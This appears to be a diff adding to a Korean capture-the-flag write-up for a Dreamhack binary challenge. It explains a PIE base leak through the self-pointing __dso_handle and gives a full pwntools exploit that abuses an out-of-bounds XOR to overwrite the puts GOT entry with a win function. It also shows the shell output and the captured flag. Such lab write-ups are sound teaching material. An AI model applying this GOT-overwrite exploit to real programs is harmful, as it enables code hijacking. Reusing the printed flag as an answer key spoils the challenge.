@@ -198,3 +198,115 @@ p.interactive()
 ```
 
 안된다.. 이유는아직 모르겠음 완벽하다고생각했는데 머지..
+
+
+```c
+.data:0000000000003480 ; =========================================================================== 
+.data:0000000000003480 
+.data:0000000000003480 ; Segment type: Pure data 
+.data:0000000000003480 ; Segment permissions: Read/Write 
+.data:0000000000003480 _data segment qword public 'DATA' use64 
+.data:0000000000003480 assume cs:_data 
+.data:0000000000003480 ;org 3480h 
+.data:0000000000003480 public __data_start ; weak 
+.data:0000000000003480 __data_start db 0 ; Alternative name is '__data_start' 
+.data:0000000000003480 ; data_start 
+.data:0000000000003481 db 0 
+.data:0000000000003482 db 0 
+.data:0000000000003483 db 0 
+.data:0000000000003484 db 0 
+.data:0000000000003485 db 0 
+.data:0000000000003486 db 0 
+.data:0000000000003487 db 0 
+.data:0000000000003488 public __dso_handle 
+.data:0000000000003488 ; void *_dso_handle 
+.data:0000000000003488 __dso_handle dq offset __dso_handle ; DATA XREF: __do_global_dtors_aux+1B↑r 
+.data:0000000000003488 ; 
+.data:__dso_handle↓o 
+.data:0000000000003488 _data ends
+```
+
+```c
+__dso_handle
+```
+C 런타임에서 atexit()로 등록된 소멸자들이 **어느 DSO 소속인지** 구분하는 용도 라고한다
+
+```c
+// 내부적으로 이렇게 동작 
+__cxa_atexit(destructor, arg, __dso_handle); 
+// ↑ "이 소멸자는 이 DSO 소속이야"
+```
+내부적으로는 이런식으로 동작하는데
+dso_handle은 링커가 컴파일시 내부적으로
+
+```c
+void *__dso_handle = &__dso_handle; // 자기 자신을 가리킴
+```
+이렇게 정의해버린다 즉 자기자신의 주소를 해당변수가 가지고있다 그래서 이번 PIE leak에 활용된다
+
+payload 구성
+
+1. dso_handle leak을통한 code_base 추출
+    
+2. win_addr 만들기
+    
+3. puts got를 arr 64번쨰에 넣고 해당값과 win을 xor
+    
+4. puts idx와 arr 64번째를 xor (put_got ^ win 다시 ^ puts_got 하면 win만 남겠죠?)
+    
+5. 트리거
+---
+
+payload
+```c
+from pwn import *
+
+p = remote("host8.dreamhack.games",23741)
+e = ELF("./main")
+
+def xor(i,j):
+    p.sendlineafter(b"> ",b"1")
+    p.sendlineafter(b"Enter i & j > ",f"{i} {j}".encode())
+    
+def print_(i):
+    p.sendlineafter(b"> ",b"2")
+    p.sendlineafter(b"Enter i > ",f"{i}".encode())
+    p.recvuntil(b"Value: ")
+    return int(p.recvline().strip(),16)
+
+win = e.symbols["win"]
+dso_handle = e.symbols["__dso_handle"]
+arr = e.symbols["arr"]
+puts = e.got["puts"]
+
+dso_idx = (dso_handle - arr) // 8
+puts_idx = (puts - arr) // 8
+
+xor("65",dso_idx)
+
+dso_st = print_("65")
+code_base = dso_st - dso_handle
+win += code_base
+
+xor("64",puts_idx)
+
+
+for i in range(64):
+    if(win>>i)&1:
+        xor("64",i)
+
+xor(puts_idx,"64")
+
+p.interactive()
+```
+
+done
+```c
+[*] Switching to interactive mode
+$ ls
+flag
+main
+$ cat flag
+DH{8475338cdd6114aad8f4c04264f523c3037d245e641118e2a7afe66710f469f4}
+$ 
+```
